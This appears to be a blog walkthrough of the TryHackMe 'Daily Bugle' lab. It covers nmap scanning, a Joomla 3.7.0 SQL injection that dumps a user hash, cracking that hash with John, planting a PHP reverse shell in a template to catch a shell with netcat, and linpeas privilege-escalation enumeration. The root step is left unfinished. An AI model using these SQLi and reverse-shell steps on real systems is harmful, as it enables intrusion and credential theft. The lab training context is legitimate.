---
title: Practical - Daily Bugle
published: true
---

[https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/dailybugle)

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

![](/assets/bugle01.png)

* * *

## [](#header-2)Task 1 - Deploy

1. ``sudo nmap -Pn -sS -T4 -p- 10.10.198.207 -oN nmap_initial.txt``
2. ``sudo nmap -sV -sC -T4 -p22,80,3306 10.10.198.207 -oN nmap_second.txt``

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)
```

##### [](#header-5)Answer the questions below

**Access the web server, who robbed the bank?**

![](/assets/bugle02.png)

- spiderman

* * *

## [](#header-2)Task 2 - Obtain user and root 

Hack into the machine and obtain the root user's credentials.

![](/assets/bugle03.png)

##### [](#header-5)Answer the questions below

**What is the Joomla version?**

- quick google find version is @ ``/administrator/manifests/files/joomla.xml``
- version 3.7.0

*Instead of using SQLMap, why not use a python script!*

- [Joomblah.py](https://github.com/stefanlucas/Exploit-Joomla/blob/master/README.md)

```shell
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

**What is Jonah's cracked password?**

- ``john jonah-pass.hash --wordlist=/usr/share/seclists/Passwords/rockyou.txt --format=bcrypt``
- spiderman123

**What is the user flag?**

1. Travel to templated and customise index.php to reverse shell ``https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php``
2. setup netcat listener, and template preview to get shell.

```shell
┌──(0xskar㉿cocokali)-[~/thm/rooms/dailybugle]
└─$ nc -nvlp 7777          
listening on [any] 7777 ...
connect to [10.2.127.225] from (UNKNOWN) [10.10.16.193] 41306
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 18:10:50 up  1:06,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
```

3. download and run ./linpeas.sh

**Things to look at:**

- OS: Linux version 3.10.0-1062.el7.x86_64
- Sudo version 1.8.23
- Vulnerable to ``CVE-2021-4034``
- Exploit suggester ``[CVE-2016-5195] dirtycow``

**SUID - Check easy privesc**

- /usr/bin/chage                        
- /usr/bin/gpasswd
- /usr/bin/chfn  --->  SuSE_9.3/10
- /usr/bin/chsh
- /usr/bin/newgrp  --->  HP-UX_10.20
- /usr/bin/su
- /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
- /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
- /usr/bin/umount  --->  BSD/Linux(08-1996)
- /usr/bin/crontab
- /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
- /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
- /usr/sbin/unix_chkpwd
- /usr/sbin/pam_timestamp_check
- /usr/sbin/usernetctl
- /usr/lib/polkit-1/polkit-agent-helper-1
- /usr/libexec/dbus-1/dbus-daemon-launch-helper

**What is the root flag?**




* * * 
